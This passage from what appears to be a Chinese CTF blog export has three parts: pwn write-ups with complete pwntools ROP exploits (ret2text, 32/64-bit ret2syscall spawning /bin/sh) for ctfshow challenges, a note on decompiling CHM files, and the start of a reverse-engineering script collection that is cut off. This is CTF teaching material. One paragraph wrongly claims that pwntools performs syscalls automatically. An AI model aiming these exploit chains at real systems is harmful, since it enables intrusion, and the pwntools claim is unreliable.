<p>32位ret2text</p>
<p>与64位原理一样，要修改成32位的格式:</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-35-34.png" alt="Clip_2024-12-04_17-35-34"></p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;,28308)#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x08048356</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x12</span>+<span class="number">4</span>) + p32(ret) + p32(<span class="number">0x08048521</span>)</span><br><span class="line"><span class="comment">#用（0x12+4）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p32(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>

<p>不同点在于p32()以及ebp的长度由8变为4。</p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h4><p>ctfshow pwn入门 pwn71</p>
<p>栈溢出</p>
<p><img src="/2025/03/02/ret2syscall/image-20240517134955943.png" alt="image-20240517134955943"></p>
<p>静态编译，可以通过ret2syscall</p>
<p>我们可以利用程序中的 gadgets 来获得shell，而对应的 shell 获取则是利用系统调用。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shel</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>

<p>我们需要pop eax ret，pop ebx ret ,pop ecx ret ,pop edx ret</p>
<p>&#x2F;bin&#x2F;sh的地址：</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-19-55.png" alt="Clip_2025-01-20_14-19-55"></p>
<p><img src="/2025/03/02/ret2syscall/image-20240517135045415.png" alt="image-20240517135045415"></p>
<p>这个可以利用</p>
<p><img src="/2025/03/02/ret2syscall/image-20240517135156006.png" alt="image-20240517135156006"></p>
<p>还有int 0x80</p>
<p><img src="/2025/03/02/ret2syscall/image-20240517135849625.png" alt="image-20240517135849625"></p>
<p>在ida中的偏移有问题，要在gdb中动调算:</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-30-35.png" alt="Clip_2025-01-20_14-30-35"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28113</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">int_80h = <span class="number">0x08049421</span> <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0xb,pop_edx_ecx_ebx,0,0,bin_sh,int_80h])</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset + p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) +p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="x32-2"><a href="#x32-2" class="headerlink" title="x32-2"></a>x32-2</h4><p>ctfshow Pwn入门 pwn72</p>
<p>32位ret2syscall，没有&#x2F;bin&#x2F;sh，利用read读入</p>
<p>计算偏移，这里ida的偏移又是错的，应该是0x28</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-40-18.png" alt="Clip_2025-01-20_14-40-18"></p>
<p>和之前一样，不同的地方是这次没有了&#x2F;bin&#x2F;sh</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-01.png" alt="Clip_2025-01-20_14-41-01"></p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-18.png" alt="Clip_2025-01-20_14-41-18"></p>
<p>在ida里面找到了read函数，可以利用read读入&#x2F;bin&#x2F;sh到bss段的一个地址，之后再ret2syscall时用这个地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read()：</span><br><span class="line">  ssize_t read(int fd,const void *buf,size_t nbytes); </span><br><span class="line">  //fd 为要读取的文件的描述符  0</span><br><span class="line">  //buf 为要读取的数据的缓冲区地址 </span><br><span class="line">  //nbytes 为要读取的数据的字节数</span><br><span class="line"></span><br><span class="line">  //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span><br><span class="line"> //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span><br><span class="line"> </span><br><span class="line">调用号：sys_read 的32位调用号 为 3 | 64位进程号为0</span><br></pre></td></tr></table></figure>

<p>那么我们可以构造调用read的rop</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop eax 0x3 ret #32位下read系统调用号</span><br><span class="line">pop ebx 0 ret   #要读取的内容描述，0</span><br><span class="line">pop ecx adress ret #adress是需要读入的地址</span><br><span class="line">pop edx length ret #读入的长度</span><br><span class="line">int 0x80 #执行系统调用</span><br></pre></td></tr></table></figure>

<p>这题写入地址就随便选一个bss段上就行0x080EB000,读入长度，”&#x2F;bin&#x2F;sh\x00”，不少于这个就行</p>
<p>之后再进行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>

<p>这题不知道为什么ROPgadget找到的int 80h用不了，用的是ida这里的</p>
<p>ROPgadget找到的这个用不了</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-12.png" alt="Clip_2025-01-20_14-44-12"></p>
<p>ida里面的这个可以用</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-56.png" alt="Clip_2025-01-20_14-44-56"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28298</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x28</span>+<span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806ecb0</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">int_80h = <span class="number">0x0806F350</span> <span class="comment"># int 0x80</span></span><br><span class="line">bss = <span class="number">0x080EB000</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0x3,pop_edx_ecx_ebx,0x10,bss,0,pop_eax,pop_edx_ecx_ebx,0,0,bss,int_80h])</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> *offset</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0x10</span>) + p32(bss) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>ctfshow pwn入门 pwn78</p>
<p>没有canary没有pie</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524102221261.png" alt="image-20240524102221261"></p>
<p>溢出函数</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524102839743.png" alt="image-20240524102839743"></p>
<p>和32位类似，只是放参数的寄存器和调用号什么的变了,64位传参顺序是rdi &gt; rsi &gt; rdx &gt; rcx &gt; r8 &gt; r9 &gt; 栈上</p>
<p>这题先调用read读入&#x2F;bin&#x2F;sh到bss段，再调用system(&#x2F;bin&#x2F;sh)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用read：</span><br><span class="line">pop rax 0 ret #将要调用的函数（read）的系统调用号存入rax(特殊，系统调用号就是放在rax里的)中，这里是0</span><br><span class="line">pop rdi 0 ret #read的第一个参数，表示标准读入</span><br><span class="line">pop rsi bss_addr ret #第二个参数，存放读入的位置，这里是bss上的一个地址</span><br><span class="line">pop rdx 0x10 ret #第三个参数，表示读入的长度，这里用0x10</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用execve(&quot;/bin/sh&quot;,NULL,NULL):</span><br><span class="line">pop rax 0x3b ret #execve的系统调用号，存入rax</span><br><span class="line">pop rdi bss_addr ret #将第一个参数/bin/sh,这里存在bss上，放入rdi中</span><br><span class="line">pop rsi 0 ret #第二个参数 0也就是NULL</span><br><span class="line">pop rdx 0 ret #第三个参数 0也就是NULL</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>在实际利用中可以省略syscall，因为使用了pwntools库的<code>remote</code>函数时，它会自动处理系统调用，因此你不需要手动添加<code>syscall</code>指令。当你发送payload时，pwntools会在内部自动构造ROP链，并执行<code>syscall</code>指令以触发系统调用。因此，即使没有明确写出<code>syscall</code>指令，<code>read</code>和<code>execve</code>系统调用仍然会被正确地触发。但是这题不知道为什么还是要加syscall 。</p>
<p>syscall ret地址：</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_15-18-11.png" alt="Clip_2025-01-20_15-18-11"></p>
<p>首先利用ROPgadget找到能利用的rop指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>

<p>首先是 pop rax ret </p>
<p><img src="/2025/03/02/ret2syscall/image-20240524112906565.png" alt="image-20240524112906565"></p>
<p>然后是pop rdi ret</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524112513371.png" alt="image-20240524112513371"></p>
<p>再是rsi和rdx，可以找到两个一起的</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524113021888.png" alt="image-20240524113021888"></p>
<p>还需要一个单独的ret，需要在read调用完之后ret再调用下一个函数execve</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524113426346.png" alt="image-20240524113426346"></p>
<p>再找一个bss段的地址用于存放&#x2F;bin&#x2F;sh</p>
<p><img src="/2025/03/02/ret2syscall/image-20240524113602768.png" alt="image-20240524113602768"></p>
<p>exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28311</span>)</span><br><span class="line">pop_rax=<span class="number">0x46b9f8</span></span><br><span class="line">pop_rdi=<span class="number">0x4016c3</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x4377f9</span></span><br><span class="line">bss=<span class="number">0x6c2000</span></span><br><span class="line">syscall=<span class="number">0x45BAC5</span> <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0x10</span>)+p64(bss)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x3b</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"><span class="comment">#execve(“/bin/sh”,0,0)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)`</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>ret2syscall</category>
      </categories>
  </entry>
  <entry>
    <title>reverse_html(chm文件)</title>
    <url>/2025/03/09/reverse-html-chm%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>遇到一个没见过的题型，记录一下</p>
<ol>
<li><p>首先怎么判断chm文件，ctf中文件类型的判断也很重要</p>
<ul>
<li><ol>
<li><p>用010查头，如果出现ITSF，很大可能是chmwenjian</p>
</li>
<li><p>用脚本查</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> chm</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    chmfile = chm.CHMFile()</span><br><span class="line">    chmfile.LoadCHM(<span class="string">&#x27;challenge&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是一个有效的CHM文件&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这不是一个有效的CHM文件&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这办法要按chm，我安失败了，安装成功的试试。</p>
</li>
</ol>
</li>
</ul>
</li>
<li><p>然后就需要一个chm解包工具了<a href="https://www.qudong9.com/tings/72161.html">CHMUnpacker</a>(付费)这里还有个<a href="https://www.pcsoft.com.cn/soft/175031.html">免费的工具</a>,或者用window里的一个工具hh.exe。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh.exe -decompile xxxxxxxx</span><br></pre></td></tr></table></figure>


</li>
<li><p>解包后(暂时写不来…..)</p>
</li>
</ol>
]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>re部分模板(持续更新)</title>
    <url>/2025/02/26/re%E9%83%A8%E5%88%86%E6%A8%A1%E6%9D%BF-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<ul>
<li><a href="#xor">xor</a></li>
<li><a href="#%E8%A7%A3%E7%9F%A9%E5%BD%A2%E6%96%B9%E9%98%B5">解矩形方阵</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E5%89%8D%E5%BA%8F%E4%B8%AD%E5%BA%8F%E6%B1%82%E5%90%8E%E7%BB%AD%E9%81%8D%E5%8E%86-%E4%BD%BF%E7%94%A8%E4%B8%AD%E5%BA%8F%E5%90%8E%E5%BA%8F%E6%B1%82%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86">使用前序中序求后续遍历-使用中序后序求前序遍历</a><ul>
<li><a href="#%E4%BD%BF%E7%94%A8%E5%89%8D%E5%BA%8F%E4%B8%AD%E5%BA%8F%E6%B1%82%E5%90%8E%E7%BB%AD%E9%81%8D%E5%8E%86">使用前序中序求后续遍历</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E4%B8%AD%E5%BA%8F%E5%90%8E%E5%BA%8F%E6%B1%82%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86">使用中序后序求前序遍历</a></li>
</ul>
</li>
<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AFsignal">网鼎杯signal</a></li>
<li><a href="#%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC%EF%BC%88SoulLike%EF%BC%89">爆破脚本（SoulLike）</a></li>
<li><a href="#%E5%B0%86%E6%95%B0%E6%8D%AE(0FD370FEB59C9B9Eh)%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%8F%AF%E8%AF%86%E5%88%AB%E5%AD%97%E7%AC%A6%E4%B8%B2">将数据(0FD370FEB59C9B9Eh)转化为可识别字符串</a></li>
<li><a href="#angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C">angr符号执行</a></li>
<li><a href="#DES%E7%AE%97%E6%B3%95%E5%9C%A8CBC%E6%A8%A1%E5%BC%8F%E4%B8%8B%E8%A7%A3%E5%AF%86%E4%B8%80%E4%B8%AABase64%E7%BC%96%E7%A0%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2">DES算法在CBC模式下解密一个Base64编码的字符串</a></li>
<li><a href="#tea%E7%9A%84%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC">tea的解密脚本</a></li>
<li><a href="#xxtea%E7%9A%84%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC">xxtea的解密脚本</a></li>
<li><a href="#rc4%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC">rc4解密脚本</a><ul>
<li><a href="#c%E8%AF%AD%E8%A8%80">c语言</a></li>
<li><a href="#python">python</a></li>
</ul>
</li>
<li><a href="#base64%E6%97%A0%E8%A1%A8%E9%AD%94%E6%94%B9%E8%A7%A3%E7%A0%81%E8%84%9A%E6%9C%AC">base64无表魔改解码脚本</a></li>
<li><a href="#mfc%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%97%B6(%E5%86%99%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%90%91MFC%E7%A8%8B%E5%BA%8F%E5%8F%91%E9%80%81%E8%BF%99%E4%B8%AA%E6%B6%88%E6%81%AF)">mfc事件处理时(写个程序向MFC程序发送这个消息)</a></li>
<li><a href="#base64%E6%8D%A2%E7%A0%81%E8%A1%A8%E7%9A%84%E8%A7%A3%E9%A2%98%E4%BB%A3%E7%A0%81">base64换码表的解题代码</a></li>
<li><a href="#%E5%85%88%E7%94%A8base64%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%86%8D%E7%94%A8rc4%E8%A7%A3%E5%AF%86">先用base64解密，再用rc4解密</a></li>
<li><a href="#Fuck%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E8%84%9A%E6%9C%AC">Fuck混淆解码脚本</a></li>
<li><a href="#IDA%E7%9A%84get_wide_dword%E7%9A%84%E4%BD%BF%E7%94%A8">IDA的get_wide_dword的使用</a></li>
<li><a href="#mov%E6%B7%B7%E6%B7%86%E7%9A%84ida%E8%84%9A%E6%9C%AC">mov混淆的ida脚本</a></li>
<li><a href="#%E4%B8%A4%E4%B8%AAEzJar.class%E6%96%87%E4%BB%B6%EF%BC%8C%E6%89%8B%E5%B7%A5%E5%88%87%E5%87%BA%E8%A7%A3%E5%8E%8B">两个EzJar.class文件，手工切出解压</a></li>
</ul>
<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#XOR脚本</span></span><br><span class="line"><span class="comment"># 定义原始数据</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0x7E</span>, <span class="comment"># &#x27;~&#x27;</span></span><br><span class="line">    <span class="number">0x7A</span>, <span class="comment"># &#x27;z&#x27;</span></span><br><span class="line">    <span class="number">0x6D</span>, <span class="comment"># &#x27;m&#x27;</span></span><br><span class="line">    <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="comment"># &#x27;B&#x27;</span></span><br><span class="line">    <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="comment"># &#x27;N&#x27;</span></span><br><span class="line">    <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x4B</span>, <span class="comment"># &#x27;K&#x27;</span></span><br><span class="line">    <span class="number">0x44</span>, <span class="comment"># &#x27;D&#x27;</span></span><br><span class="line">    <span class="number">0x00</span>  <span class="comment"># 假设以0x00结尾</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR 操作数</span></span><br><span class="line">xor_value = <span class="number">0x39</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行异或操作</span></span><br><span class="line">result = [byte ^ xor_value <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果转换为字符串，不可打印的字符用点号表示</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_printable_string</span>(<span class="params">byte_list</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> byte_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始数据:&quot;</span>, [<span class="built_in">hex</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;XOR 后的数据:&quot;</span>, [<span class="built_in">hex</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> result])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;XOR 后的字符串:&quot;</span>, to_printable_string(result))</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="解矩形方阵"><a href="#解矩形方阵" class="headerlink" title="解矩形方阵"></a>解矩形方阵</h2><p>第一种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v1,v2,v3,v4,v5,v6,v7,v8,v9,v11 = Ints(<span class="string">&#x27;v1 v2 v3 v4 v5 v6 v7 v8 v9 v11&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 * <span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line">check = s.check()</span><br><span class="line"><span class="built_in">print</span>(check)</span><br><span class="line">model = s.model()</span><br><span class="line"><span class="built_in">print</span>(model）</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the solver</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create 14 BitVecs for each character in the input string, assuming ASCII encoding (8 bits per character)</span></span><br><span class="line">input_chars = [BitVec(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ensure that all characters are valid ASCII characters</span></span><br><span class="line"><span class="keyword">for</span> char <span 